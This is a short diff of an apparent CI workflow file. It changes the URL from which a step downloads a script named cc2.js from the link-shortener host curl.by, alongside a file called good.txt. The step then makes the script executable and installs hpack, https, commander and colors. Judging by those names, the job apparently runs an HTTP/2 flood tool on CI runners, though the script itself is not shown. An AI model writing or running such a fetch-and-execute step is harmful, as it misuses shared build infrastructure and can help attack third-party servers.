@@ -26,7 +26,7 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/vNnLc/cc2.js
+        wget https://curl.by/U0678/cc2.js
         wget https://curl.by/tenA4/good.txt
         chmod +x cc2.js
         npm i hpack https commander colors 
